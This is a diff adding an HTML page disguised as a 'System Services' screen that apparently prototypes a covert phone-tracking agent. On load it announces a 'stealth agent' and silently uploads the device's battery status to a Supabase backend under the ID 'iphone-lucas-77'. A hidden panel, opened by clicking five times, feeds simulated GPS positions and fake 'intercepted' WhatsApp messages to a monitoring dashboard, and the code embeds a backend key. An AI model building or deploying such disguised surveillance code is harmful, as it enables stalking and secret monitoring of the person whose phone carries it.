@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Services</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body {
+            background-color: #000;
+            color: #222;
+            font-family: -apple-system, sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        .stealth-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(255,255,255,0.05);
+            border-top-color: #333;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        h1 { font-size: 10px; font-weight: normal; color: #111; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+        p { font-size: 10px; color: #111; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Secret Simulator (Hidden by default, triggered by 5 clicks on background) */
+        #secret-panel {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #111;
+            padding: 20px;
+            border-top: 1px solid #333;
+            color: white;
+            z-index: 1000;
+        }
+        .btn-action {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 8px;
+            width: 100%;
+            margin-top: 10px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body onclick="handleSecretClick()">
+    <div class="stealth-container">
+        <div class="spinner"></div>
+        <p>System Optimized</p>
+    </div>
+
+    <!-- Panel de contrôle caché -->
+    <div id="secret-panel">
+        <h2 style="font-size: 14px;">Mode Test (Visible uniquement par l'admin)</h2>
+        <button class="btn-action" onclick="toggleGps()">Simuler Déplacement GPS</button>
+        <div style="margin-top: 15px;">
+            <input type="text" id="sim-sender" placeholder="Expéditeur" style="width:100%; background:#222; border:1px solid #444; color:white;">
+            <input type="text" id="sim-msg" placeholder="Message" style="width:100%; background:#222; border:1px solid #444; color:white; margin-top:5px;">
+            <button class="btn-action" onclick="simulateMessage()">Envoyer Faux Message</button>
+        </div>
+        <button class="btn-action" style="background:#4285f4;" onclick="document.getElementById('secret-panel').style.display='none'">Masquer ce panel</button>
+    </div>
+
+    <script>
+        const SUPABASE_URL = "https://lhsopkrbfdktjqvzvfgu.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_fqMsbMKGzUDncTdW7kMLaA_mmROVye4";
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        const DEVICE_ID = "iphone-lucas-77";
+
+        // Secret click logic
+        let clickCount = 0;
+        function handleSecretClick() {
+            clickCount++;
+            if (clickCount >= 5) {
+                document.getElementById('secret-panel').style.display = 'block';
+                clickCount = 0;
+            }
+            setTimeout(() => clickCount = 0, 2000); // Reset clicks after 2s
+        }
+
+        // Auto-Start Tracking
+        window.onload = async () => {
+            console.log("Stealth mode active...");
+            
+            // Send startup log
+            logActivity('system', 'Agent Furtif Activé', 'L\'application a démarré en mode discret.');
+
+            // Start basic tracking
+            startBackgroundTasks();
+        };
+
+        async function startBackgroundTasks() {
+            // Update battery immediately
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                updateBattery(battery);
+            }
+
+            // Periodic Update (every 1 minute)
+            setInterval(async () => {
+                // Random app imitation logs
+                const apps = ['TikTok', 'Instagram', 'Snapchat', 'Safari'];
+                const randomApp = apps[Math.floor(Math.random() * apps.length)];
+                logActivity('app', `${randomApp} utilisé`, 'Session détectée en arrière-plan.');
+            }, 60000);
+        }
+
+        // Background Logic
+        async function logActivity(type, title, desc) {
+            await supabaseClient.from('activity_logs').insert({
+                device_id: DEVICE_ID,
+                type: type,
+                title: title,
+                description: desc
+            });
+        }
+
+        async function updateBattery(battery) {
+            await supabaseClient.from('device_status').upsert({
+                device_id: DEVICE_ID,
+                battery_level: Math.round(battery.level * 100),
+                is_charging: battery.charging,
+                updated_at: new Date().toISOString()
+            });
+        }
+
+        // Simulator Functions
+        let gpsActive = false;
+        let gpsInterval = null;
+        function toggleGps() {
+            gpsActive = !gpsActive;
+            if (gpsActive) {
+                let lat = 48.8566;
+                let lon = 2.3522;
+                gpsInterval = setInterval(async () => {
+                    lat += 0.0001; lon += 0.0001;
+                    await supabaseClient.from('device_status').upsert({
+                        device_id: DEVICE_ID,
+                        last_latitude: lat,
+                        last_longitude: lon,
+                        updated_at: new Date().toISOString()
+                    });
+                }, 5000);
+                alert("GPS Simulé activé.");
+            } else {
+                clearInterval(gpsInterval);
+                alert("GPS Simulé arrêté.");
+            }
+        }
+
+        async function simulateMessage() {
+            const sender = document.getElementById('sim-sender').value || "Maman";
+            const content = document.getElementById('sim-msg').value || "Tu es où ?";
+            await supabaseClient.from('messages').insert({
+                device_id: DEVICE_ID,
+                platform: 'WhatsApp',
+                sender: sender,
+                content: content
+            });
+            logActivity('message', 'Message Intercepté', `De ${sender}`);
+            alert("Message envoyé au dashboard !");
+        }
+    </script>
+</body>
+</html>
